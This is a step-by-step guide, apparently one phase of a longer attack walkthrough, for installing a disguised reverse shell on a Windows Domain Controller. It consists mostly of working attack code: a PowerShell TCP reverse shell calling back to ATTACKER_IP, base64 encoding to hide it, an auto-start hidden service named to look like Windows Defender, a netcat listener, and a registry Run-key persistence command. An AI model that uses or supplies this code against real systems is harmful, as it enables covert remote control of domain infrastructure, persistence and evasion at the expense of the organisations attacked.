## Phase 8: `WinDefMon` Reverse Shell Service on DC

### 1. 📜 **Reverse Shell Payload**

Save this script as `C:\ProgramData\winmon.ps1` on the **Domain Controller**:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",9999)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

---
### 2. 🔐 **Base64 Encode It**

```powershell
$payload = Get-Content -Raw C:\ProgramData\winmon.ps1
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)
```

---
### 3. ⚙️ **Create the Service as WinDefMon**

```powershell
$cmd = "powershell.exe -NoP -W Hidden -Enc $encoded"
sc.exe create WinDefMon binPath= "$cmd" start= auto
sc.exe start WinDefMon
```

💡 *Use quotes properly after `binPath=` and ensure the encoded string doesn't break on multiple lines if scripting.*

---
### 4. 🧪 **Start Your Listener**

```bash
nc -lvnp 9999
```
---

Or use registry run keys:

```bash
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t 

REG_SZ /d "powershell.exe -WindowStyle Hidden -File C:\Users\Public\rev.ps1"
```
